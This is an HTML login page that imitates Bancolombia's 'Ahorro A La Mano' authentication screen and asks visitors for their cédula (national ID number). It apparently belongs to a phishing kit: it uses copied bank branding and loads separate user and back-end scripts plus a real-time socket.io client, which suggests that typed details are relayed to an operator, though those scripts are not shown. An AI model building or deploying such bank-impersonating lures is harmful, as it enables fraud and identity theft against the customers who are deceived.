<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Autenticación Bancolombia</title>
    <link rel="stylesheet" href="./styles/estilos.css" />
    <link rel="icon" type="image/png" href="./media/logo.png" />
    <script src="../../js/functions.js"></script>
  </head>
  <body>
    <header class="header">
      <img
        src="media/headerIconBancolombia.e9678f112a702758542f8f98283cea47.svg"
        alt="Logo Centro"
        class="logo-center"
      />
      <div class="exit-container">
        <span class="exit-text">Salir</span>
        <img
          src="media/ExitIcon.35b2413abce276ac588d59c3ef6b1251.svg"
          alt="Icono Salir"
          class="logo-right"
        />
      </div>
    </header>

    <div class="welcome-container">
      <span class="welcome-text">Te damos la bienvenida</span>
    </div>

    <div class="modal-container">
      <p class="modal-text">
        La cédula con la que<br />
        ingresa a<br />
        <strong>Ahorro A La Mano</strong>
      </p>

      <!-- Nueva sección añadida -->
      <div class="user-info">
        <div class="user-details">
          <img
            src="media/user.39a37ef47269f6d65906fbb23186e4b6.svg"
            alt="Icono Usuario"
            class="user-icon"
          />
          <input
            type="text"
            id="user-input"
            style="padding-left: 12px"
            class="user-input"
            placeholder="Cédula"
            maxlength="10"
          />
        </div>
        <hr class="separator" />
        <a href="#" class="forgot-user">¿Olvidaste tu usuario?</a>
      </div>

      <!-- Nuevos botones añadidos -->
      <div class="buttons-container">
        <button class="btn volver" id="back-button">Volver</button>
        <button class="btn continuar" id="continue">Continuar</button>
      </div>
    </div>

    <!-- Nuevo contenedor para la imagen "trazo" -->
    <div class="trazo-container">
      <img
        src="media/trazo-desktop.3de67dbd4b31f3798f8a1d3e3a90197c.svg"
        alt="Trazo"
        class="trazo-image"
      />
    </div>

    <script>
      // JavaScript para restringir la entrada a números y limitar a 10 dígitos
      document
        .getElementById("user-input")
        .addEventListener("input", function (e) {
          const input = e.target;
          // Elimina cualquier carácter que no sea dígito
          input.value = input.value.replace(/\D/g, "");
          // Limita el número de caracteres a 10
          if (input.value.length > 10) {
            input.value = input.value.slice(0, 10);
          }
        });
    </script>
    <script src="js/user.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
    <script src="js/back.js"></script>
  </body>
</html>
